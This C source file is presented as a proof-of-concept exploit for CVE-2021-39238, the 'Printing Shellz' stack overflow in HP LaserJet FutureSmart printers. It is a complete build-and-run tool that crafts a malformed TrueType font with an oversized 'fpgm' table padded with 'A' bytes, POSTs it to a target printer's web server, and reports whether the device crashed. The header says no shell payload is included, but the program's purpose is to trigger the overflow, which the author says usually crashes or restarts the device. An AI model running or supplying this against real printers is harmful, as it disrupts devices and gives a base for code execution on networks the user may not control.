/*
 * HP LaserJet Enterprise MFP FutureSmart Stack BOF Trigger — CVE-2021-39238
 * =========================================================================
 * Author: André Henrique (@mrhenrike) | União Geek
 *
 * Triggers the "Printing Shellz" stack-based buffer overflow in HP LaserJet
 * Enterprise MFP / PageWide Managed devices running FutureSmart firmware
 * (FS3 < 3.9.8, FS4 < 4.11.2.1, FS5 < 5.3) by sending a crafted HTTP POST
 * to the printer's web server with a malformed font blob embedded in the
 * print job.  The font parser overflows a fixed-size stack buffer when
 * processing certain TrueType font tables (e.g. the 'fpgm' program table).
 *
 * NOTE: This is a detection-oriented PoC.  No shell payload is included.
 *       The exploit sends an oversized crafted blob and checks for anomalous
 *       HTTP responses (connection reset / 500) that indicate the overflow
 *       was triggered.  A successful hit usually means the device crashed or
 *       restarted — patch immediately.
 *
 * Usage: ./exploit <host> <port>
 * Build: gcc -O2 -Wall -o exploit source.c
 *
 * References:
 *   https://nvd.nist.gov/vuln/detail/CVE-2021-39238
 *   https://support.hp.com/us-en/document/ish_4951621-4951652-16
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef int socklen_t;
#else
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <unistd.h>
#endif

#define OVERFLOW_LEN   2048
#define FONT_MAGIC     "\x00\x01\x00\x00"   /* TrueType sfVersion */
#define FPGM_TAG       "fpgm"
#define HTTP_TIMEOUT   10

/* Minimal TrueType font header fields */
#define TT_NUM_TABLES  1
#define TT_SEARCH_RANGE  16
#define TT_ENTRY_SEL  0
#define TT_RANGE_SHIFT  0

static int connect_to(const char *host, int port) {
    struct addrinfo hints, *res;
    char port_str[8];
    int fd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0) {
        fprintf(stderr, "[-] getaddrinfo failed for %s:%d\n", host, port);
        return -1;
    }

    fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }

    if (connect(fd, res->ai_addr, (socklen_t)res->ai_addrlen) != 0) {
        fprintf(stderr, "[-] connect failed to %s:%d\n", host, port);
#ifdef _WIN32
        closesocket(fd);
#else
        close(fd);
#endif
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* Build a minimal malformed TrueType font with an oversized fpgm table */
static size_t build_font(unsigned char *buf, size_t buflen) {
    size_t pos = 0;

    /* sfVersion: TrueType 1.0 */
    memcpy(buf + pos, FONT_MAGIC, 4); pos += 4;
    /* numTables */ buf[pos++] = 0x00; buf[pos++] = TT_NUM_TABLES;
    /* searchRange */ buf[pos++] = 0x00; buf[pos++] = TT_SEARCH_RANGE;
    /* entrySelector */ buf[pos++] = 0x00; buf[pos++] = TT_ENTRY_SEL;
    /* rangeShift */ buf[pos++] = 0x00; buf[pos++] = TT_RANGE_SHIFT;

    /* Table directory entry for fpgm */
    memcpy(buf + pos, FPGM_TAG, 4); pos += 4;
    /* checkSum */ memset(buf + pos, 0xDE, 4); pos += 4;
    /* offset: points right after directory (offset 28) */
    uint32_t offset = 28;
    buf[pos++] = (offset >> 24) & 0xFF;
    buf[pos++] = (offset >> 16) & 0xFF;
    buf[pos++] = (offset >> 8)  & 0xFF;
    buf[pos++] = offset         & 0xFF;
    /* length: deliberately oversized to trigger the overflow */
    uint32_t table_len = OVERFLOW_LEN;
    buf[pos++] = (table_len >> 24) & 0xFF;
    buf[pos++] = (table_len >> 16) & 0xFF;
    buf[pos++] = (table_len >> 8)  & 0xFF;
    buf[pos++] = table_len         & 0xFF;

    /* Overflow payload — fills attacker-controlled stack region */
    size_t remaining = buflen - pos;
    size_t fill = remaining < OVERFLOW_LEN ? remaining : OVERFLOW_LEN;
    memset(buf + pos, 0x41, fill);  /* 'A' * fill */
    pos += fill;

    (void)buflen;
    return pos;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    unsigned char font[4096];
    size_t font_len = build_font(font, sizeof(font));

    printf("[*] CVE-2021-39238 HP FutureSmart Stack BOF — Printing Shellz\n");
    printf("[*] Target: %s:%d\n", host, port);
    printf("[*] Font payload size: %zu bytes (overflow target: %d)\n",
           font_len, OVERFLOW_LEN);

    int fd = connect_to(host, port);
    if (fd < 0) {
        fprintf(stderr, "[-] Could not connect to %s:%d\n", host, port);
        return 2;
    }

    /* Build HTTP POST with crafted font blob as body */
    char header[512];
    int hlen = snprintf(header, sizeof(header),
        "POST /hp/jetdirect/printjob HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n",
        host, font_len);

#ifdef _WIN32
    send(fd, header, hlen, 0);
    send(fd, (const char *)font, (int)font_len, 0);
#else
    write(fd, header, (size_t)hlen);
    write(fd, font, font_len);
#endif

    /* Read response to detect crash / overflow */
    char resp[512];
    memset(resp, 0, sizeof(resp));
#ifdef _WIN32
    int n = recv(fd, resp, sizeof(resp) - 1, 0);
    closesocket(fd);
#else
    int n = read(fd, resp, sizeof(resp) - 1);
    close(fd);
#endif

    if (n <= 0) {
        printf("[+] No response / connection reset — possible BOF triggered!\n");
        printf("[!] Device may have crashed. Verify CVE-2021-39238 presence.\n");
        return 0;
    }

    if (strstr(resp, "500") || strstr(resp, "Internal Server Error")) {
        printf("[+] HTTP 500 received — overflow likely triggered (CVE-2021-39238).\n");
        return 0;
    }

    printf("[-] Response received (may not be vulnerable or already patched):\n");
    printf("    %.120s\n", resp);
    return 1;
}
